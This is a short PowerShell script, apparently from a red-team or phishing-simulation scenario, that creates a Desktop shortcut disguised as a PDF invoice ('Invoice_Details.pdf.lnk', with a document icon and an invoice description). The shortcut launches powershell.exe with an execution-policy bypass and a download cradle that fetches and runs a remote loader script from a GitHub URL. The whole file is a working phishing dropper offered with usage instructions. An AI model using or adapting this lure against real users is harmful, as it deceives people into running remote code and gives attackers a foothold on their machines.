# Run this on the target Windows host to create the phishing LNK on Desktop.
# Usage: powershell -NoP -Exec Bypass -File create-lnk.ps1

$scriptBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario3/main"

$ws = New-Object -ComObject WScript.Shell
$sc = $ws.CreateShortcut([Environment]::GetFolderPath("Desktop") + "\Invoice_Details.pdf.lnk")
$sc.TargetPath = "powershell.exe"
$sc.Arguments = "-NoP -Exec Bypass -C `"iex((New-Object Net.WebClient).DownloadString('$scriptBase/loader.ps2'))`""
$sc.IconLocation = "C:\Windows\System32\imageres.dll, 67"
$sc.Description = "Invoice details - June 2026"
$sc.Save()

Write-Host "[+] LNK created at Desktop\Invoice_Details.pdf.lnk"
Write-Host "[*] Target: powershell.exe with download cradle to $scriptBase/loader.ps2"
